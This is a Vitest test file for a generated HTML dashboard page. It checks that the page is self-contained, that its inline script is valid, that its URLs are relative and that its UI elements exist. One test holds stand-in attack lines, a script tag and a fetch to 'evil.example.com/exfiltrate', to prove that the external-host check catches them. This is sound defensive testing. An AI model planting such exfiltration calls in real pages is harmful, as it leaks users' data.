import ts from 'typescript'
import { expect, test } from 'vitest'
import { buildPage } from './page.js'
import { matchRunRoute } from './mission-control-server.js'

test('the page is a complete, self-contained HTML document', () => {
  const html = buildPage()
  expect(html).toMatch(/^<!doctype html>/i)
  expect(html).toContain('<style>')
  expect(html).toContain('<script>')
  expect(html).toContain('</html>')
})

// The inline <script> block is TypeScript source text embedded in a giant
// template literal - `tsc` only ever sees it as a string, so a corrupted
// escape sequence inside it (e.g. \n or \s written with a single backslash,
// which the OUTER template literal itself interprets as an escape before the
// text ever reaches the browser - turning /\n\s*\n/ into a regex containing
// real newline bytes) compiles cleanly and produces a page whose embedded
// script is a hard SyntaxError, silently killing every dynamic feature with
// no compiler or lint signal. ts.transpileModule only parses/transpiles the
// extracted text - it never executes it - so this surfaces the same syntax
// error a browser would hit, without ever running the extracted text as
// code the way a dynamic-code-execution approach would.
test('the inline client script is syntactically valid JavaScript', () => {
  const html = buildPage()
  const match = html.match(/<script>([\s\S]*)<\/script>/)
  expect(match).not.toBeNull()
  const script = match![1]!
  const { diagnostics } = ts.transpileModule(script, { reportDiagnostics: true })
  const messages = (diagnostics ?? []).map((d) => ts.flattenDiagnosticMessageText(d.messageText, '\n'))
  expect(messages).toEqual([])
})

// The back-link is only ever shown when nested under mission control's
// /run/<hash>/<runId>/ route (see the inline script's back.style.display
// logic below), so its relative href must resolve from exactly that depth
// back to mission control's own root - not to the /run/ path one level short
// of it, which matchRunRoute (mission-control-server.ts) 404s on since it
// requires both a hash and a runId segment.
test('the back-link resolves from the nested run route to mission control\'s actual root, not a 404', () => {
  const html = buildPage()
  const match = html.match(/id="back-link" href="([^"]+)"/)
  expect(match).not.toBeNull()
  const href = match![1]!
  const resolved = new URL(href, 'http://localhost/run/somehash/somerunid/').pathname
  expect(resolved).toBe('/')
  expect(matchRunRoute(resolved)).toBeNull()
})

test('nothing in the page reaches out to an external host', () => {
  const html = buildPage()
  // A bare http(s):// substring scan is too broad: it also flags legitimate,
  // never-fetched strings like the SVG XML namespace URI passed to
  // createElementNS. Instead, scope the check to the actual ways a page can
  // reach out to a network host: link/script tags, and fetch/XHR/WebSocket/
  // EventSource calls that target an http(s):// URL (same-origin calls like
  // fetch('/model') or new EventSource('/events') are fine).
  expect(html).not.toMatch(/<link\b/i)          // no external stylesheet/font
  expect(html).not.toMatch(/<script\s+src=/i)   // no external script (only inline <script>)
  expect(html).not.toMatch(/fetch\(\s*['"]https?:/i)
  expect(html).not.toMatch(/new\s+(XMLHttpRequest|WebSocket|EventSource)\(\s*['"]https?:/i)
  expect(html).not.toMatch(/cdn\./i)
})

test('the self-containment check still catches a real external-URL violation', () => {
  const maliciousSnippet = '<script src="https://evil.example.com/x.js"></script>'
  expect(maliciousSnippet).toMatch(/<script\s+src=/i)

  const maliciousFetch = `fetch('https://evil.example.com/exfiltrate')`
  expect(maliciousFetch).toMatch(/fetch\(\s*['"]https?:/i)

  const maliciousEventSource = `new EventSource('https://evil.example.com/events')`
  expect(maliciousEventSource).toMatch(/new\s+(XMLHttpRequest|WebSocket|EventSource)\(\s*['"]https?:/i)
})

test('the inline client wires EventSource(\'events\') and fetch(\'model\') as relative URLs', () => {
  // Deliberately relative, not '/events'/'/model': this same page is served
  // both standalone at '/' and nested under mission control's
  // '/run/<hash>/<runId>/' - an absolute path would always hit the site
  // root and 404 under mission control.
  const html = buildPage()
  expect(html).toContain(`new EventSource('events')`)
  expect(html).toContain(`fetch('model')`)
})

test('the page renders an empty-state message container for a run with no events yet', () => {
  const html = buildPage()
  expect(html).toContain('id="empty-state"')
})

test('the page defines a live-output section, hidden by default, with a tab strip and output body', () => {
  const html = buildPage()
  expect(html).toContain('id="live-output-section"')
  expect(html).toContain('id="live-tabs"')
  expect(html).toContain('id="live-output-body"')
})

test('the inline client renders live output tabs from the running nodes on every re-render', () => {
  const html = buildPage()
  expect(html).toContain('function renderLiveOutput(model)')
  expect(html).toContain('renderLiveOutput(model)') // called from render(model), not just defined
})

test('the default tab is the first running node, and clicking a tab is wired via addEventListener', () => {
  const html = buildPage()
  expect(html).toContain('selectedTab = running[0].id')
  expect(html).toContain('addEventListener')
})

test('the page has a Calls gauge, wired to totals.calls, distinct from iteration/replans', () => {
  const html = buildPage()
  expect(html).toContain('id="calls-label"')
  expect(html).toContain("document.getElementById('calls-label').textContent = String(model.totals.calls)")
})

test('the resume row includes a wall-minutes input alongside iterations/cost, prefilled from totals.maxWallMinutes and posted on resume', () => {
  const html = buildPage()
  expect(html).toContain('id="resume-wall-minutes"')
  expect(html).toContain('model.totals.maxWallMinutes')
  expect(html).toMatch(/maxWallMinutes:\s*wallMinutes/)
})
